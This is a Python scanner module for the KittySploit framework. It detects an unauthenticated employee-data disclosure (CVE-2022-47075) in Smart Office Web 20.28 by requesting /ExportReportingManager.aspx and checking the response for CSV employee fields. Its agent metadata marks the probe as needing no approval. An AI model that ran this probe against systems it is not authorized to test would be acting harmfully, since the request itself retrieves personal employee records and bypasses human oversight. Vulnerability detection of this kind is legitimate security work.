#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An issue was discovered in Smart Office Web 20."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Smart Office Web 20.28 - Information Disclosure Detection',
        'description': 'An issue was discovered in Smart Office Web 20.28 and earlier allows attackers to download sensitive information via the action name parameter to ExportEmployeeDetails.aspx, and to ExportReportingManager.aspx.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'packetstorm', 'smart-office', 'info', 'exposure', 'smartofficepayroll', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/173093/Smart-Office-Web-20.28-Information-Disclosure-Insecure-Direct-Object-Reference.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-47075',
            'http://packetstormsecurity.com/files/173093/Smart-Office-Web-20.28-Information-Disclosure-Insecure-Direct-Object-Reference.html',
            'https://cvewalkthrough.com/smart-office-suite-unauthenticated-data-ex/',
            'https://youtu.be/D42upepxzwM',
        ],
        'cve': 'CVE-2022-47075',
    }

    def run(self):
        r = self.http_request(method="GET", path='/ExportReportingManager.aspx', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('application/CSV', 'EmployeeName', 'EmployeeCode',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="Smart Office Web 20.28 - Information Disclosure detected",
                path='/ExportReportingManager.aspx',
            )
            return True
        return False

